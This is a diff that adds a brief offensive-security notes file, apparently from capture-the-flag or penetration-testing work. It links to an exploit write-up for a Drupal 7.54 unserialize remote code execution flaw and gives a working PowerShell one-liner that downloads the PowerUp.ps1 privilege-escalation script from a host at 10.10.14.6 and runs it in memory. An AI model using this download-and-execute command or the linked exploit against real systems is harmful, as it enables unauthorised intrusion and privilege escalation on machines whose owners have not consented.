@@ -1,0 +1,7 @@
+drupal 7.54 unserilaized poc
+	https://www.ambionics.io/blog/drupal-services-module-rce
+
+powershell execute from cmd
+
+echo IEX(New-Object Net.webclient).downloadString("http://10.10.14.6/PowerUp.ps1") | powershell -noprofile -
+
